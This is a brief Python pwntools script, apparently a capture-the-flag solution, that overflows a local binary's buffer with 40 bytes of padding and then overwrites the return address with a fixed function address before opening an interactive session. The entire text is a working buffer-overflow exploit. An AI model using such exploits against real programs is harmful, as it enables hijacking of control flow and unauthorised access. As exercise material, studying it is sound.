from pwn import *

file_name = './source'
binary = ELF(file_name)
payload = cyclic(40) + p64(0x00000000004011d6)
target = process(file_name)
target.sendline(payload)
target.interactive()